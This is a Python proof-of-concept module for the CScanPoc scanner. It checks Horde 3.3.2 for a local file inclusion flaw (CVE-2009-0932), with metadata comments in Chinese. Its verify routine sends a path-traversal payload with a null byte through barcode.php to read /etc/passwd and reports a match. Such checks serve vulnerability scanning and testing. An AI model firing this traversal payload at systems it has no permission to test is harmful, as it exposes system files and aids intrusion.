# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'Horde_0001' # 平台漏洞编号，留空
    name = 'Horde 等地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2011-10-02'  # 漏洞公布时间
    desc = '''
        The version of Horde, Horde Groupware, or Horde Groupware Webmail Edition
        installed on the remote host fails to filter input to the 'driver' argument
        of the  'Horde_Image::factory' method before using it to include PHP code in
        'lib/Horde/Image.php'.  Regardless of PHP's 'register_globals' and
        'magic_quotes_gpc' settings, an unauthenticated attacker can exploit this
        issue to view arbitrary files or possibly to execute arbitrary PHP code on
        the remote host, subject to the privileges of the web server user id.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/16154/'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = 'CVE-2009-0932'  # cve编号
    product = 'Horde'  # 漏洞应用名称
    product_version = '3.3.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b62b0517-399b-4319-b059-7b579756efcc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload = "/util/barcode.php?type=../../../../../../../../../../../etc/passwd%00"
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            pattern=re.compile("(root|bin|daemon|sys|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[a-z]+:\d+:\d+:")
            content = urllib2.urlopen(req).read()

            if req.getcode() == 200 and pattern.search(content):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
